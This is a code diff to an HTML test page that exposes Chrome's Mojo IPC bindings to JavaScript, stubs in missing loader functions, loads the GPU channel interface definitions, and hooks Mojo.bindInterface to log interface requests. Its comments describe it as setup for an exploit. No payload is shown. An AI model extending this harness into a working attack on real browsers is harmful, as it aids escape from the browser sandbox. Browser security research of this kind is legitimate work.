@@ -8,32 +8,45 @@
     <canvas id="target-canvas" width="10" height="10"></canvas>
     
     <script type="module">
-        // 1. Import the lowercase 'mojo' from bindings.js
         import { mojo } from './gen/mojo/public/js/bindings.js';
         
-        // 2. Make it global so gpu_channel.mojom.js can find it!
+        // 1. Expose mojo globally
         window.mojo = mojo;
         console.log("[+] mojo namespace exposed globally");
 
-        // 3. Dynamically load gpu_channel.mojom.js AFTER window.mojo is set
+        // 2. Polyfill the missing legacy functions so gpu_channel.mojom.js doesn't crash
+        window.mojo.internal.isMojomLoaded = function(id) { return false; };
+        window.mojo.internal.markMojomLoaded = function(id) {};
+        window.mojo.internal.loadMojomIfNecessary = function(path, file) {
+            console.log("[*] Mock loading dependency: " + file);
+        };
+        window.mojo.internal.exposeNamespace = function(namespace) {
+            let parts = namespace.split('.');
+            let parent = window;
+            for (let part of parts) {
+                if (!parent[part]) parent[part] = {};
+                parent = parent[part];
+            }
+            return parent;
+        };
+
+        // 3. Now dynamically load gpu_channel.mojom.js
         const script = document.createElement('script');
         script.src = './gen/gpu/ipc/common/gpu_channel.mojom.js';
         
         script.onload = () => {
             console.log("[+] gpu_channel.mojom.js loaded successfully!");
+            console.log("[+] gpu.mojom namespace available: ", window.gpu.mojom);
             startExploit();
         };
         document.head.appendChild(script);
 
-        // 4. The actual exploit logic
+        // 4. Our Exploit setup
         function startExploit() {
-            // The native 'Mojo' (uppercase) is automatically provided by Chrome
-            console.log("[+] Native Mojo API: ", window.Mojo);
-
-            // Hook the bindInterface function
+            // Hook the bindInterface function to watch what Chrome requests
             const original_bind = window.Mojo.bindInterface;
             window.Mojo.bindInterface = function(interfaceName, pipe, host) {
-                console.log("[*] Intercepted Mojo Interface: " + interfaceName);
+                console.log("[*] Intercepted Mojo Interface Request: " + interfaceName);
                 return original_bind(interfaceName, pipe, host);
             };
 
@@ -43,7 +56,7 @@
                 const canvas = document.getElementById('target-canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.fillRect(0, 0, 10, 10);
-            }, 1000);
+            }, 500);
         }
     </script>
 </body>
